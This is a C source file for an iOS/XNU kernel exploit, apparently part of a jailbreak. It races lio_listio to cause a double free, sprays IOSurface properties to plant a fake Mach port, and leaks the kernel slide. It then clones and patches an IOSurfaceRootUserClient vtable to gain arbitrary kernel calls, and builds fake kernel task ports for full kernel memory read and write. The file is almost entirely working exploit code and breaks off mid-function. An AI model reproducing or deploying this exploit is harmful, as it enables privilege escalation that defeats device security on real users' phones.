#include <mach/mach.h>
#include <sys/mman.h>
#include <pthread.h>
#include <dlfcn.h>
#include <aio.h>

#include "common.h"
#include "kdata.h"
#include "iokit.h"

#include "pwn.h"

/*  Mach spelunking  */
#define IO_BITS_ACTIVE      0x80000000
#define IOT_PORT            0
#define IKOT_TASK           2
#define IKOT_IOKIT_CONNECT  29

/*  # of AIO structs  */
#define NENT 1

typedef struct {
    mach_msg_header_t head;
    mach_msg_body_t msgh_body;
    mach_msg_ool_ports_descriptor_t desc[1];
    char pad[4096];
} ool_message_struct;

typedef volatile union
{
    struct {
        struct {
            kptr_t data;
            uint32_t reserved : 24,
            type     :  8;
            uint32_t pad;
        } lock; // mutex lock
        uint32_t ref_count;
        uint32_t active;
        uint32_t halting;
        uint32_t pad;
        kptr_t map;
    } a;
} ktask_t;

typedef struct 
{
    mach_msg_header_t head;
    uint64_t verification_key;
    char data[0];
    char padding[4];
} mach_msg_data_buffer_t;

kern_return_t (^kcall)(uint64_t, int, ...);
uint64_t (^zonemap_fix_addr)(uint64_t);

void (^kreadbuf)(uint64_t, void *, size_t) ;
void (^kwritebuf)(uint64_t, void *, size_t);

uint32_t (^kread32)(uint64_t);
uint64_t (^kread64)(uint64_t);

void (^kwrite32)(uint64_t, uint32_t);
void (^kwrite64)(uint64_t, uint64_t);

uint64_t kslide;

bool should_run_race = true;

void *double_free(void *a)
{
    uint64_t err;
    
    int mode = LIO_NOWAIT;
    int nent = NENT;
    char buf[NENT];
    void *sigp = NULL;
    
    struct aiocb** aio_list = NULL;
    struct aiocb*  aios = NULL;
    
    char path[1024];
    snprintf(path, sizeof(path), "%slightspeed", getenv("TMPDIR"));
    
    int fd = open(path, O_RDWR|O_CREAT, S_IRWXU|S_IRWXG|S_IRWXO);
    if (fd < 0)
    {
        perror("open");
        goto exit;
    }
    
    /* prepare real aio */
    aio_list = malloc(nent * sizeof(*aio_list));
    if (aio_list == NULL)
    {
        perror("malloc");
        goto exit;
    }
    
    aios = malloc(nent * sizeof(*aios));
    if (aios == NULL)
    {
        perror("malloc");
        goto exit;
    }
    
    memset(aios, 0, nent * sizeof(*aios));
    for (uint32_t i = 0; i < nent; i++)
    {
        struct aiocb *aio = &aios[i];
        
        aio->aio_fildes = fd;
        aio->aio_offset = 0;
        aio->aio_buf = &buf[i];
        aio->aio_nbytes = 1;
        aio->aio_lio_opcode = LIO_READ; // change that to LIO_NOP for a DoS :D
        aio->aio_sigevent.sigev_notify = SIGEV_NONE;
        
        aio_list[i] = aio;
    }
    
    while (should_run_race)
    {
        lio_listio(mode, aio_list, nent, sigp);
        
        aio_return(aio_list[0]);
    }
    
exit:
    if (fd >= 0)
        close(fd);
    
    if (aio_list != NULL)
        free(aio_list);
    
    if (aios != NULL)
        free(aios);
    
    return NULL;
}

static uint32_t transpose(uint32_t val)
{
    uint32_t ret = 0;
    for (size_t i = 0; val > 0; i += 8)
    {
        ret += (val % 255) << i;
        val /= 255;
    }
    return ret + 0x01010101;
}

uint32_t *static_spray_data = NULL;

uint32_t curr_highest_key = 0;
uint32_t *get_me_some_spray_data(uint32_t surface_id, kptr_t kdata_addr, uint32_t *spray_count)
{
    const uint32_t spray_qty = 20;
    *spray_count = (8 + (spray_qty * 5)) * sizeof(uint32_t);

    if (static_spray_data == NULL)
    {
        LOG("initializing spray data...");

        static_spray_data = malloc(*spray_count);
        
        uint32_t *spray_cur = static_spray_data;
        *(spray_cur++) = surface_id;
        *(spray_cur++) = 0x0;
        *(spray_cur++) = kOSSerializeMagic;
        *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | 3;
        *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeDictionary | 2;
        *(spray_cur++) = kOSSerializeSymbol | 4;
        *(spray_cur++) = transpose(curr_highest_key++) & 0x00ffffff;
        *(spray_cur++) = kOSSerializeEndCollection | kOSSerializeArray | spray_qty;
        
        for (int i = 1; i <= spray_qty; i++)
        {
            *(spray_cur++) = (i == spray_qty ? kOSSerializeEndCollection : 0) | kOSSerializeData | 0x10;
            
            void *copy_to_here = spray_cur;
            *(spray_cur++) = 0xaaaaaaaa;
            *(spray_cur++) = 0xbbbbbbbb;
            *(spray_cur++) = 0x00000000;
            *(spray_cur++) = 0x00000000;
            
            memcpy(copy_to_here, &kdata_addr, sizeof(kptr_t));
        }

        return static_spray_data;
    }

    static_spray_data[6] = transpose(curr_highest_key++) & 0x00ffffff;

    return static_spray_data;
}

void release_spray_data()
{
    if (static_spray_data == NULL)
    {
        return;
    }

    free(static_spray_data);
    static_spray_data = NULL;
}

// kinda messy function signature 
uint64_t send_buffer_to_kernel_and_find(offsets_t offs, uint64_t (^read64)(uint64_t addr), uint64_t our_task_addr, mach_msg_data_buffer_t *buffer_msg, size_t msg_size)
{
    kern_return_t ret;

    buffer_msg->head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    buffer_msg->head.msgh_local_port = MACH_PORT_NULL;
    buffer_msg->head.msgh_size = msg_size;

    mach_port_t port;
    ret = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to allocate mach port: %x", ret);
        goto err;
    }
    
    LOG("got port: %x", port);

    ret = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed ot insert send right: %x", ret);
        goto err;
    }
    
    ret = mach_ports_register(mach_task_self(), &port, 1);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to register mach port: %x", ret);
        goto err;
    }
    
    buffer_msg->head.msgh_remote_port = port;

    ret = mach_msg(&buffer_msg->head, MACH_SEND_MSG, buffer_msg->head.msgh_size, 0, 0, 0, 0);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to send mach message: %x (%s)", ret, mach_error_string(ret));
        goto err;
    }
    
    uint64_t itk_registered = read64(our_task_addr + offs.struct_offsets.itk_registered);
    if (itk_registered == 0x0)
    {
        LOG("failed to read our_task_addr->itk_registered!");
        goto err;
    }

    LOG("itk_registered: %llx", itk_registered);

    uint16_t msg_count = read64(itk_registered + offsetof(kport_t, ip_messages.port.msgcount)) & 0xffff;
    if (msg_count != 1)
    {
        LOG("got weird msgcount! expected 1 but got: %x", msg_count);
        goto err;
    }

    LOG("msg_count: %d", msg_count);

    uint64_t messages = read64(itk_registered + offsetof(kport_t, ip_messages.port.messages));
    if (messages == 0x0)
    {
        LOG("unable to find ip_messages.port.messages in kernel port!");
        goto err;
    }

    LOG("messages: %llx", messages);

    uint64_t header = read64(messages + 0x18); // ipc_kmsg->ikm_header
    if (header == 0x0)
    {
        LOG("unable to find ipc_kmsg->ikm_header");
        goto err;
    }
    
    LOG("header: %llx", header);

    uint64_t key_address = header + 0x20; // ikm_header->verification_key (in the msg body)

    LOG("key_address: %llx", key_address);

    uint64_t kernel_key = read64(key_address);
    if (kernel_key != buffer_msg->verification_key)
    {
        LOG("kernel verification key did not match! found wrong kmsg? expected: %llx, got: %llx", buffer_msg->verification_key, kernel_key);
        goto err;
    }

    ret = mach_ports_register(mach_task_self(), NULL, 0);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call mach_ports_register: %x", ret);
        goto err;
    }

    return key_address + sizeof(kernel_key);

err:
    return 0x0;    
}

kern_return_t pwn_kernel(offsets_t offsets, task_t *tfp0, kptr_t *kbase)
{
    kern_return_t ret = KERN_FAILURE;
    kport_t *fakeport                   = NULL;
    pthread_t lio_listio_thread         = NULL;
    mach_port_t *port_buffer            = NULL;
    mach_port_t the_one                 = MACH_PORT_NULL;
    mach_port_t notification_port       = MACH_PORT_NULL;
    mach_port_array_t maps              = NULL;
    mach_msg_type_number_t maps_num     = 0;
    ool_message_struct ool_message, ool_message_recv;
    
    uint64_t receiver_addr              = 0,
    our_task_addr                       = 0,
    ip_kobject_client_port_addr         = 0,
    ip_kobject_client_addr              = 0,
    client_vtab_addr                    = 0;

    LOG("---> pwning kernel...");

    kptr_t kdata = kdata_init();
    if(!kdata) goto out;

    LOG("our kdata buffer is at: %llx", kdata);

    // note to friends, family, next of kin, hackers alike:
    // host_page_size - returns the userland page size, *always* 16K
    // _host_page_size - MIG call, traps to kernel, returns PAGE_SIZE macro, will return the correct page size
    vm_size_t pgsize = 0x0;
    _host_page_size(mach_host_self(), &pgsize);
    LOG("page size: 0x%lx", pgsize);
    
    io_service_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOSurfaceRoot"));
    if (service == MACH_PORT_NULL)
    {
        LOG("failed to get IOSurfaceRoot service");
        return KERN_FAILURE;
    }
    
    io_connect_t client = MACH_PORT_NULL;
    ret = IOServiceOpen(service, mach_task_self(), 0, &client);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to open IOSurfaceRoot user client: %x (%s)", ret, mach_error_string(ret));
        return KERN_FAILURE;
    }
    
    LOG("opened client: %x", client);
    
    uint32_t dict_create[] =
    {
        kOSSerializeMagic,
        kOSSerializeEndCollection | kOSSerializeDictionary | 1,
        
        kOSSerializeSymbol | 19,
        0x75534f49, 0x63616672, 0x6c6c4165, 0x6953636f, 0x657a, // "IOSurfaceAllocSize"
        kOSSerializeEndCollection | kOSSerializeNumber | 32,
        0x1000,
        0x0
    };
    
    typedef struct
    {
        mach_vm_address_t addr1;
        mach_vm_address_t addr2;
        uint32_t id;
    } surface_t;

    size_t size = offsets.iosurface.create_outsize;
    surface_t *surface = malloc(size);
    bzero(surface, size);

    ret = IOConnectCallStructMethod(client, offsets.iosurface.create_surface, dict_create, sizeof(dict_create), surface, &size);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call iosurface create surface");
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("surface ID: %x", surface->id);
    
    // setup ports for the ool msg
    port_buffer = malloc(sizeof(mach_port_t));
    *port_buffer = MACH_PORT_NULL;
    
    // setup ool message
    bzero(&ool_message, sizeof(ool_message));
    bzero(&ool_message_recv, sizeof(ool_message_recv));
    
    ool_message.head.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0) | MACH_MSGH_BITS_COMPLEX;
    ool_message.head.msgh_local_port = MACH_PORT_NULL;
    ool_message.head.msgh_size = sizeof(ool_message) - 2048;
    ool_message.msgh_body.msgh_descriptor_count = 1;
    ool_message.desc[0].address = port_buffer;
    ool_message.desc[0].count = 1;
    ool_message.desc[0].type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    ool_message.desc[0].disposition = MACH_MSG_TYPE_MOVE_RECEIVE;
    
    // setup fake obj
    fakeport = (kport_t *)mmap(0, KDATA_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANON, -1, 0);
    bzero((void *)fakeport, KDATA_SIZE);
    mlock((void *)fakeport, KDATA_SIZE);
    LOG("fakeport: %p", fakeport);
    
    fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT;
    fakeport->ip_references = 100;
    fakeport->ip_lock.type = 0x11;
    fakeport->ip_messages.port.receiver_name = 1;
    fakeport->ip_messages.port.msgcount = MACH_PORT_QLIMIT_KERNEL;
    fakeport->ip_messages.port.qlimit = MACH_PORT_QLIMIT_KERNEL;
    fakeport->ip_srights = 99;
    
    ret = kdata_write((const void *)fakeport); // causes the fakeport buffer to buf flushed into kernel 
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to write to kernel buffer! ret: %x", ret);
        goto out;
    }

    uint32_t spray_dictsz = 0x0, dummy = 0x0;
    size = sizeof(dummy);
    
    LOG("pre-spraying...");

    // always pre-spray, kids
    for (int i = 0; i < 100; i++)
    {
        uint32_t spray_dictsz = 0;
        uint32_t *spray_data = get_me_some_spray_data(surface->id, kdata, &spray_dictsz);

        uint32_t dummy = 0;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);

        if (ret != KERN_SUCCESS)
        {
            LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
            ret = KERN_FAILURE;
            goto out;
        }
    }

    LOG("spraying ports & racing...");
    
    // this will try to double free an obj as long as the second dword of it will be zero, obj is alloced in kalloc.16
    pthread_create(&lio_listio_thread, NULL, double_free, NULL);
    
    // race
    while (true)
    {
        mach_port_t msg_port = MACH_PORT_NULL;
        mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &msg_port);
        
        // sending the message
        ool_message.head.msgh_remote_port = msg_port;
        mach_msg(&ool_message.head, MACH_SEND_MSG, ool_message.head.msgh_size, 0, 0, 0, 0);
        
        // spray spray spray
        // kdata = address of 'fakeport' buffer in kernel space 
        uint32_t *spray_data = get_me_some_spray_data(surface->id, kdata, &spray_dictsz);
        
        IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);
        
        // recieve the messages and check if the port is not dead
        ool_message_recv.head.msgh_local_port = msg_port;
        mach_msg(&ool_message_recv.head, MACH_RCV_MSG, 0, sizeof(ool_message_recv), msg_port, 0, 0);
        
        mach_port_t *check_port = ool_message_recv.desc[0].address;
        
        mach_port_deallocate(mach_task_self(), msg_port);
        
        if (*check_port != MACH_PORT_NULL)
        {
            // wanna set this and stop racing asap
            should_run_race = false;
            
            the_one = *check_port;
            
            LOG("[!] found non-null port at 0x%x", the_one);

            break;
        }

        mach_msg_destroy(&ool_message_recv.head);
    }
    
    if (the_one == MACH_PORT_NULL)
    {
        should_run_race = false;
    }
    
    // spray some more to ensure we fill any holes left from the race (not sure if this helps)
    for (int i = 0; i < 100; i++)
    {
        uint32_t spray_dictsz = 0;
        uint32_t *spray_data = get_me_some_spray_data(surface->id, kdata, &spray_dictsz);
        
        uint32_t dummy = 0;
        size = sizeof(dummy);
        ret = IOConnectCallStructMethod(client, offsets.iosurface.set_value, spray_data, spray_dictsz, &dummy, &size);

        if (ret != KERN_SUCCESS)
        {
            LOG("failed to call iosurface set value: %x (%s)", ret, mach_error_string(ret));
            ret = KERN_FAILURE;
            goto out;
        }
    }
    
    if (the_one == MACH_PORT_NULL)
    {
        LOG("ran out of ports :-(");
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("---> we out here!");
    
    // allocate new port and assign it into port->ip_pdrequest to leak heap addr
    mach_port_t prev_port = MACH_PORT_NULL;
    ret = _kernelrpc_mach_port_allocate_trap(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &notification_port);
    if (ret != KERN_SUCCESS)
    {
        LOG("kernelrpc_mach_port_allocate_trap failed: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    ret = mach_port_request_notification(mach_task_self(), the_one, MACH_NOTIFY_PORT_DESTROYED, 0, notification_port, MACH_MSG_TYPE_MAKE_SEND_ONCE, &prev_port);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_port_request_notification %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    // insert a send right on the userland port
    ret = _kernelrpc_mach_port_insert_right_trap(mach_task_self(), the_one, the_one, MACH_MSG_TYPE_MAKE_SEND);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to insert send right on the_one: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    ret = kdata_read((void *)fakeport);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to read kdata buffer!");
        goto out;
    }

    if (fakeport->ip_pdrequest == 0)
    {
        LOG("fakeport->ip_pdrequest == 0");
        ret = KERN_FAILURE;
        goto out;
    }
    
    uint64_t heapaddr = fakeport->ip_pdrequest;
    LOG("[+] got port/kernel heap address %llx", heapaddr);
    
    // set that to somewhere in the buffer
    // kport_t is of size 0xA8
    fakeport->ip_requests = kdata + 0xA8 + 0x8; 
    uint64_t *kread_addr = (uint64_t *)(((uint64_t)fakeport) + 0xA8 + 0x8 + offsets.struct_offsets.ipr_size); // kread_addr now points to where ip_requests points + offset of ipr_size
    
    mach_msg_type_number_t out_sz = 1;
    #define kr32(addr,value)\
    *kread_addr = addr;\
    kdata_write((const void *)fakeport);\
    mach_port_get_attributes(mach_task_self(), the_one, MACH_PORT_DNREQUESTS_SIZE, (mach_port_info_t)&value, &out_sz);
    
    uint32_t tmp_32read = 0;
    #define kr64(addr,value)\
    value = 0; \
    kr32(addr, value);\
    kr32(addr + 0x4, tmp_32read); \
    value = value | (((uint64_t)tmp_32read) << 32);
    
    // register the client we have onto our task
    ret = mach_ports_register(mach_task_self(), &client, 1);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to call mach_ports_register on client: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    // get our task pointer
    kr64(heapaddr + offsetof(kport_t, ip_receiver), receiver_addr);
    LOG("[+] receiver addr %llx", receiver_addr);
    
    kr64(receiver_addr + offsets.struct_offsets.is_task_offset, our_task_addr);
    LOG("[+] our task addr %llx", our_task_addr);
    
    // get the vtab of the client
    kr64(our_task_addr + offsets.struct_offsets.itk_registered, ip_kobject_client_port_addr);
    LOG("[+] the address of our client port %llx", ip_kobject_client_port_addr);
    
    kr64(ip_kobject_client_port_addr + offsetof(kport_t, ip_kobject), ip_kobject_client_addr);
    LOG("[+] address of the UC %llx", ip_kobject_client_addr);
    
    kr64(ip_kobject_client_addr, client_vtab_addr);
    LOG("[+] kernel text leak/vtab addr %llx", client_vtab_addr);
    
    kslide = client_vtab_addr - offsets.vtabs.iosurface_root_userclient;
    LOG("[!] got kernel slide: %llx!", kslide);
    
    /*  set up arbitrary kernel call primitive  */
    
    uint64_t IOSurfaceRootUserClient_addr = ip_kobject_client_addr;
    uint64_t IOSurfaceRootUserClient_vtab = client_vtab_addr;
    
    // using a size of 0xC0: 
    // iometa -Csovp IOSurfaceRootUserClient kernel | grep 'vtab=' -B 1
    // Shows us that the highest vtab method resides at 0x5c8 within IOSurfaceRootUserClient itself
    // 0x5c8 + 0x8 = 0x5d0
    // 0x5d0 / 8 = 0xBA methods
    // we can round to 64-bit aligned by adding 0x6, 0xBA + 0x6 = 0xC0 
    size_t vtab_msg_sz = sizeof(mach_msg_data_buffer_t) + (0xC0 * sizeof(uint64_t));
    LOG("vtab msg size: %x", vtab_msg_sz);
 
    mach_msg_data_buffer_t *vtab_msg = (mach_msg_data_buffer_t *)malloc(vtab_msg_sz);
    bzero(vtab_msg, vtab_msg_sz);

    // safety check to make sure we found the right message
    vtab_msg->verification_key = 0x4141414142424242;

    LOG("cloning vtab...");
    
    // copy out vtable into message body
    for (int i = 0; i < 0xC0; i++)
    {
        uint64_t vtab_entry = 0x0;
        kr64(IOSurfaceRootUserClient_vtab + (i * sizeof(uint64_t)), vtab_entry);
        *(uint64_t *)(&vtab_msg->data[i * sizeof(uint64_t)]) = vtab_entry;
    }

    // patch getExternalTrapForIndex
    *(uint64_t *)(&vtab_msg->data[0xb7 * sizeof(uint64_t)]) = offsets.gadgets.add_x0_x0_ret + kslide;

    // send vtab to kernel and stash the address of the buffer
    uint64_t kernel_vtab_buf = send_buffer_to_kernel_and_find(offsets, ^(uint64_t addr)
    {
        uint64_t u64_read_tmp;
        kr64(addr, u64_read_tmp);
        return u64_read_tmp;
    }, our_task_addr, vtab_msg, vtab_msg_sz);
    if (kernel_vtab_buf == 0x0)
    {
        LOG("failed to get kernel_vtab_buf!");
        ret = KERN_FAILURE;
        goto out;
    }

    LOG("got kernel_vtab_buf at: %llx", kernel_vtab_buf);

    uint64_t fake_client = (uint64_t)fakeport + 0xC0;
    LOG("fake_client: %llx", fake_client);

    // copy out cpp client object into message body
    // we've got ~0x380 bytes of space left in our 0x400 buffer, 
    // assuming 0x80 bytes for the fakeport + ip_requests read buffer 
    for (int i = 0; i < 0x200; i++)
    {
        uint64_t obj_entry = 0x0;
        kr64(IOSurfaceRootUserClient_addr + (i * 0x8), obj_entry);
        *(uint64_t *)(fake_client + (i * 0x8)) = obj_entry;
    }
    
    // assign fake vtable into our fake client
    *(uint64_t *)(fake_client + 0x0) = kernel_vtab_buf;

    // update fakeport as iokit obj & insert new fake client
    fakeport->ip_bits = IO_BITS_ACTIVE | IOT_PORT | IKOT_IOKIT_CONNECT;
    fakeport->ip_kobject = kdata + 0xC0;

    ret = kdata_write((const void *)fakeport);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to write to kdata buffer! (2): %x", ret);
        goto out;
    }

    // no longer needed
#undef kr32
#undef kr64
    
    kcall = ^(uint64_t addr, int n_args, ...)
    {
        if (n_args > 7)
        {
            LOG("no more than 7 args you cheeky fuck");
            return KERN_INVALID_ARGUMENT;
        }
        
        va_list ap;
        va_start(ap, n_args);
        
        uint64_t args[7] = { 0 };
        for (int i = 0; i < n_args; i++)
        {
            args[i] = va_arg(ap, uint64_t);
        }
        
        // first arg must always have a value
        if (n_args == 0 ||
            args[0] == 0x0)
        {
            args[0] = 0x1;
        }
        
        *(uint64_t *)(fake_client + 0x40) = args[0];
        *(uint64_t *)(fake_client + 0x48) = addr + kslide;
        
        kern_return_t ret = kdata_write((const void *)fakeport);
        if (ret != KERN_SUCCESS)
        {
            LOG("failed to write to kdata buffer! ret: %x", ret);
            return 0x0;
        }

        return IOConnectTrap6(the_one, 0, args[1], args[2], args[3], args[4], args[5], args[6]);
    };

    /*  once we have an execution primitive we can use copyin/copyout funcs to freely read/write kernel mem  */
    
    kreadbuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets.funcs.copyout, 3, addr, buf, len);
    };
    
    kread32 = ^(uint64_t addr)
    {
        uint32_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };
    
    kread64 = ^(uint64_t addr)
    {
        uint64_t val = 0;
        kreadbuf(addr, &val, sizeof(val));
        return val;
    };
    
    kwritebuf = ^(uint64_t addr, void *buf, size_t len)
    {
        kcall(offsets.funcs.copyin, 3, buf, addr, len);
    };
    
    kwrite32 = ^(uint64_t addr, uint32_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };
    
    kwrite64 = ^(uint64_t addr, uint64_t val)
    {
        kwritebuf(addr, &val, sizeof(val));
    };
    
    uint64_t zone_map_addr = kread64(offsets.data.zone_map + kslide);
    if (zone_map_addr == 0x0)
    {
        LOG("failed to get zone map addr");
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("[+] got zone map addr: %llx", zone_map_addr);

    typedef volatile struct
    {
        kptr_t prev;
        kptr_t next;
        kptr_t start;
        kptr_t end;
    } kmap_hdr_t;
    
    kmap_hdr_t zm_hdr = { 0 };
    
    // lck_rw_t = uintptr_t opaque[2] = unsigned long opaque[2]
    kreadbuf(zone_map_addr + (sizeof(unsigned long) * 2), (void *)&zm_hdr, sizeof(zm_hdr));
    
    LOG("zmap start: %llx", zm_hdr.start);
    LOG("zmap end: %llx", zm_hdr.end);
    
    uint64_t zm_size = zm_hdr.end - zm_hdr.start;
    LOG("zmap size: %llx", zm_size);
    
    if (zm_size > 0x100000000)
    {
        LOG("zonemap too large :/");
        ret = KERN_FAILURE;
        goto out;
    }
    
    zonemap_fix_addr = ^(uint64_t addr)
    {
        uint64_t spelunk = (zm_hdr.start & 0xffffffff00000000) | (addr & 0xffffffff);
        return spelunk < zm_hdr.start ? spelunk + 0x100000000 : spelunk;
    };
    
    uint64_t kern_task_addr = kread64(offsets.data.kernel_task + kslide);
    if (kern_task_addr == 0x0)
    {
        LOG("failed to read kern_task_addr!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] kern_task_addr: %llx", kern_task_addr);
    
    uint64_t kern_proc = zonemap_fix_addr(kcall(offsets.funcs.get_bsdtask_info, 1, kern_task_addr));
    if (kern_proc == 0x0)
    {
        LOG("failed to read kern_proc!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] got kernproc: %llx", kern_proc);;
    
    uint64_t curr_task = zonemap_fix_addr(kcall(offsets.funcs.current_task, 0));
    if (curr_task == 0x0)
    {
        LOG("failed to get curr_task!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("[+] curr task: %llx", curr_task);
    
    // get kernel map
    uint64_t kernel_vm_map = kread64(kern_task_addr + 0x20);
    if (kernel_vm_map == 0x0)
    {
        LOG("failed to read kernel_vm_map!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("got kernel vm map: %llx", kernel_vm_map);
    
    uint64_t ipc_space_kernel = kread64(ip_kobject_client_port_addr + offsetof(kport_t, ip_receiver));;
    if (ipc_space_kernel == 0x0)
    {
        LOG("failed to read ipc_space_kernel!");
        ret = KERN_FAILURE;
        goto out;
    }
    LOG("ipc_space_kernel: %llx", ipc_space_kernel);
    
    uint64_t ptrs[2] = { 0 };
    ptrs[0] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    ptrs[1] = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("zm_port addr: %llx", ptrs[0]);
    LOG("km_port addr: %llx", ptrs[1]);
    
    size_t ktask_size = offsets.struct_offsets.sizeof_task;

    mach_msg_data_buffer_t *zm_task_buf_msg = (mach_msg_data_buffer_t *)malloc(ktask_size);
    bzero(zm_task_buf_msg, ktask_size);

    zm_task_buf_msg->verification_key = 0x4242424243434343;

    ktask_t *zm_task_buf = (ktask_t *)(&zm_task_buf_msg->data[0]);

    zm_task_buf->a.lock.data = 0x0;
    zm_task_buf->a.lock.type = 0x22;
    zm_task_buf->a.ref_count = 100;
    zm_task_buf->a.active = 1;
    *(kptr_t *)((uint64_t)zm_task_buf + offsets.struct_offsets.task_itk_self) = 1;
    zm_task_buf->a.map = zone_map_addr;

    // duplicate the message and update it for fake ktask
    mach_msg_data_buffer_t *km_task_buf_msg = (mach_msg_data_buffer_t *)malloc(ktask_size);
    memcpy(km_task_buf_msg, zm_task_buf_msg, ktask_size);

    km_task_buf_msg->verification_key = 0x4343434344444444;

    ktask_t *km_task_buf = (ktask_t *)(&km_task_buf_msg->data[0]);
    km_task_buf->a.map = kernel_vm_map;

    // send both messages into kernel and grab the buffer addresses
    uint64_t zm_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, zm_task_buf_msg, ktask_size);
    if (zm_task_buf_addr == 0x0)
    {
        LOG("failed to get zm_task_buf_addr!");
        goto out;
    }

    LOG("zm_task_buf_addr: %llx", zm_task_buf_addr);

    uint64_t km_task_buf_addr = send_buffer_to_kernel_and_find(offsets, kread64, our_task_addr, km_task_buf_msg, ktask_size);
    if (km_task_buf_addr == 0x0)
    {
        LOG("failed to get km_task_buf_addr!");
        goto out;
    }

    LOG("km_task_buf_addr: %llx", km_task_buf_addr);

    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[0], (uint64_t)zm_task_buf, IKOT_TASK);
    kcall(offsets.funcs.ipc_kobject_set, 3, ptrs[1], (uint64_t)km_task_buf, IKOT_TASK);
    
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, ptrs[0]);
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, ptrs[1]);
    
    // usleep(50000);
    
    ret = mach_ports_lookup(mach_task_self(), &maps, &maps_num);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to lookup mach ports: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("zone_map port: %x", maps[0]);
    LOG("kernel_map port: %x", maps[1]);
    
    if (!MACH_PORT_VALID(maps[0]) ||
        !MACH_PORT_VALID(maps[1]))
    {
        LOG("invalid zone/kernel map ports");
        ret = KERN_FAILURE;
        goto out;
    }
    
    ptrs[0] = ptrs[1] = 0x0;

    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x0, 0x0);
    kwrite64(curr_task + offsets.struct_offsets.itk_registered + 0x8, 0x0);
    
    LOG("kern_task_addr: %llx", kern_task_addr);
    
    mach_vm_address_t remap_addr = 0x0;
    vm_prot_t cur = 0x0, max = 0x0;
    ret = mach_vm_remap(maps[1], &remap_addr, offsets.struct_offsets.sizeof_task, 0, VM_FLAGS_ANYWHERE | VM_FLAGS_RETURN_DATA_ADDR, maps[0], kern_task_addr, false, &cur, &max, VM_INHERIT_NONE);
    if (ret != KERN_SUCCESS)
    {
        LOG("mach_vm_remap failed: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    LOG("[+] remap addr: %llx", remap_addr);

    // usleep(500000);
    
    mach_port_destroy(mach_task_self(), maps[0]);
    mach_port_destroy(mach_task_self(), maps[1]);
    
    // remap must cover the entire struct and be page aligned 
    uint64_t remap_start = remap_addr & ~(pgsize - 1);
    uint64_t remap_end = (remap_addr + offsets.struct_offsets.sizeof_task + pgsize) & ~(pgsize - 1);
    
    // kern_return_t vm_map_wire_external(vm_map_t map, vm_map_offset_t start, vm_map_offset_t end, vm_prot_t caller_prot, boolean_t user_wire)
    ret = kcall(offsets.funcs.vm_map_wire_external, 5, kernel_vm_map, remap_start, remap_end, VM_PROT_READ | VM_PROT_WRITE, false);
    if (ret != KERN_SUCCESS)
    {
        LOG("failed to kcall vm_map_wire_external: %x (%s)", ret, mach_error_string(ret));
        ret = KERN_FAILURE;
        goto out;
    }
    
    uint64_t new_port = zonemap_fix_addr(kcall(offsets.funcs.ipc_port_alloc_special, 1, ipc_space_kernel));
    LOG("new_port: %llx", new_port);
    
    // usleep(500000);

    kcall(offsets.funcs.ipc_kobject_set, 3, new_port, remap_addr, IKOT_TASK);
    kcall(offsets.funcs.ipc_port_make_send, 1, new_port);
    
    uint64_t realhost = offsets.data.realhost + kslide;
    LOG("[!] realhost: %llx", realhost);
    
    // realhost->special[4]
